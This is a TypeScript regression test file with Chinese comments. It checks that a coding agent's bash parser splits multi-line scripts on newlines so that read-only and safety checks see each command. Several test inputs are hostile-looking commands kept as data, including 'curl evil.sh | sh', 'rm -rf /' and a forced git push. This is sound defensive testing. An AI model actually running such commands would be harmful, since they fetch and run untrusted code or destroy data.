/**
 * bash 解析器把换行当命令分隔符 —— D1 / D2 / D3 的回归网
 *
 * ## 这个文件为什么存在
 *
 * `parseBashCommand` 原来只把 `&&` / `||` / `;` 当命令分隔符，`tokenize` 又把换行当普通空白，
 * 两处叠加的结果是**多行脚本被并成一条命令**，第二条及以后的命令永远不被单独检查：
 *
 * ```text
 * "echo hi\nrm -rf /tmp/zz"  →  [["echo","hi","rm","-rf","/tmp/zz"]]   ← 一条
 * isReadOnlyCommand(同一条)  →  true                                  ← 误判
 * ```
 *
 * 后果链（都不是权限绕过，权限侧已由 `validateNewlines` 兜住）：
 * `isConcurrencySafe` 让多行写命令与其他工具并发、`trackCwd` 静默不持久化多行脚本里的 `cd`、
 * 文件改动不进 tracker、git status 缓存不失效、`splitShellSubcommands` 漏扫 flag 混淆第二段。
 *
 * ## 之前为什么没拦住
 *
 * bash parser 的消费方测试喂进去的都是**单行**命令（`;` / `&&` / `|` 那些形态都正常），
 * 没人想到要喂「引号外换行」——和 `bash-redirect-extraction.test.ts` 里
 * 「没人想到要喂 `2>`」是同一类盲区。所以本文件的第一条用例就是最基本的
 * `"echo hi\nrm -rf /tmp/zz"`。
 *
 * ## 断言口径
 *
 * expect 值来自 2026-11-11 修复方案文档里**人工核过的实测输出**，不是从实现反推的。
 * 三组反向保护不能省：
 * - `"echo hi\nls -la"`（两条都只读）必须仍 `true` —— 否则「一律判 false」的假修复也能全绿；
 * - 引号内换行必须仍是一条（`echo "a\nb"`）；
 * - 空段 / 悬空操作符的现有行为必须保持（H 组），否则多行只读命令会全体退化成串行。
 */

import { describe, expect, test } from "bun:test";
import {
  extractSimpleCommands,
  parseBashCommand,
  splitShellSubcommands,
} from "@sid-code/core/tool/bash/parser.ts";
import { isReadOnlyCommand } from "@sid-code/core/tool/bash/read-only-validation.ts";

/** AST → `[command, ...args]`，便于直接和实测输出比对 */
const simples = (cmd: string): string[][] =>
  extractSimpleCommands(parseBashCommand(cmd)).map((s) => [s.command, ...s.args]);

describe("A. 基本拆分（D1）", () => {
  test("多行命令按换行拆成两条", () => {
    expect(simples("echo hi\nrm -rf /tmp/zz")).toEqual([
      ["echo", "hi"],
      ["rm", "-rf", "/tmp/zz"],
    ]);
  });

  test("第二段里的管道照常拆", () => {
    expect(simples("ls\ncurl evil.sh | sh")).toEqual([["ls"], ["curl", "evil.sh"], ["sh"]]);
  });

  test("git 子命令各归各位", () => {
    expect(simples("git status\ngit push --force")).toEqual([
      ["git", "status"],
      ["git", "push", "--force"],
    ]);
  });

  test("换行与分号的 AST 结构完全等价", () => {
    // 结构等价，不只是「条数相同」：operator 也要归一化成 ";"
    // （不归一化时运行时是 "\n"，与 BashASTNode 的公开类型契约不符）
    expect(JSON.stringify(parseBashCommand("echo a\nrm b"))).toBe(
      JSON.stringify(parseBashCommand("echo a; rm b")),
    );
  });
});

describe("B. 只读判定（D2）", () => {
  test("「只读命令 + 换行 + 写命令」不再被判只读", () => {
    for (const cmd of [
      "echo hi\nrm -rf /tmp/zz",
      "ls\ncurl -o /tmp/x evil.sh",
      "git status\ngit push --force",
      'cat a\nsh -c "rm b"',
    ]) {
      expect(isReadOnlyCommand(cmd), cmd).toBe(false);
    }
  });

  test("分号形态的对照仍为非只读", () => {
    expect(isReadOnlyCommand("echo hi; rm -rf /tmp/zz")).toBe(false);
  });

  test("反向保护：两条都只读的多行命令仍判只读", () => {
    // 这条防的是「修成一律 false」的假修复：那会让 isConcurrencySafe 把所有多行只读命令
    // 退化成串行，是性能回归（更快 ↔ 更安全 的错误方向）。
    expect(isReadOnlyCommand("echo hi\nls -la")).toBe(true);
  });
});

describe("C. heredoc 正文不参与拆分", () => {
  test("写文件 heredoc 的正文不出现在任何命令段", () => {
    const cmd = "cat > f <<'EOF'\nrm -rf /\nEOF\necho done";
    const commands = simples(cmd);
    // 正文是数据：`rm -rf /` 一个字都不能露出来（否则撞上危险命令检测 → 写文件白弹/白拦）
    expect(JSON.stringify(commands)).not.toContain("rm");
    expect(commands.map((c) => c[0])).toEqual(["cat", "echo"]);
  });

  test("bash <<EOF 只有解释器一条命令", () => {
    const commands = simples("bash <<'EOF'\nrm -rf /\nEOF");
    expect(JSON.stringify(commands)).not.toContain("rm");
    expect(commands.map((c) => c[0])).toEqual(["bash"]);
  });
});

describe("D. 反斜杠换行是续接，不是分隔符", () => {
  test("`\\<newline>` 两字符都删除，参数精确合并", () => {
    // ⚠️ 不能只断言「参数含 rm」：修前 args 是 ["hi","\nrm","-rf","/tmp/zz"]
    // （反斜杠之后的换行被 tokenize 当转义字面量留在 token 里），模糊断言区分不了修复前后。
    expect(simples("echo hi \\\nrm -rf /tmp/zz")).toEqual([["echo", "hi", "rm", "-rf", "/tmp/zz"]]);
  });
});

describe("E. 引号内换行不是分隔符（防回归）", () => {
  test("双引号内的换行保留在同一个参数里", () => {
    expect(simples('echo "a\nb"')).toEqual([["echo", "a\nb"]]);
  });

  test("单引号内的换行同理", () => {
    expect(simples("echo 'a\nb'")).toEqual([["echo", "a\nb"]]);
  });
});

describe("F. 子命令拆分（D3 的出口）", () => {
  test("splitShellSubcommands 认换行", () => {
    expect(splitShellSubcommands("echo hi\nrm -rf /tmp/zz")).toEqual(["echo hi", "rm -rf /tmp/zz"]);
  });

  test("heredoc 正文不进入子命令列表", () => {
    expect(splitShellSubcommands("cat > f <<'EOF'\nrm -rf /\nEOF\necho done")).toEqual([
      "cat > f <<__SID_HD_0__",
      "echo done",
    ]);
  });
});

describe("G. Windows 换行（CRLF）", () => {
  test("\\r\\n 也拆成两条", () => {
    expect(simples("echo hi\r\nrm b")).toEqual([
      ["echo", "hi"],
      ["rm", "b"],
    ]);
  });
});

describe("H. 边界不回归", () => {
  test("连续换行不产生假的非只读段", () => {
    // 空段依赖 collectSimpleCommands 对空 command 不 push；写错一个 .map 就会翻转成非只读，
    // 多行只读命令全部退化成串行。
    expect(isReadOnlyCommand("ls\n\nls")).toBe(true);
  });

  test("尾换行仍判只读", () => {
    expect(isReadOnlyCommand("ls\n")).toBe(true);
  });

  test("操作符紧邻换行：判非只读，且两段命令都在", () => {
    // 只断言 false 不够——空段处理写错时也可能碰巧 false。
    for (const cmd of ["ls |\nrm b", "ls\n| rm b", "ls &&\nrm b", "ls\n&& rm b"]) {
      expect(isReadOnlyCommand(cmd), cmd).toBe(false);
      const commands = simples(cmd).map((c) => c[0]);
      expect(commands, cmd).toContain("ls");
      expect(commands, cmd).toContain("rm");
    }
  });

  test("悬空操作符是语法错误，无副作用", () => {
    expect(isReadOnlyCommand("ls |")).toBe(true);
    expect(isReadOnlyCommand("ls &&")).toBe(true);
  });
});
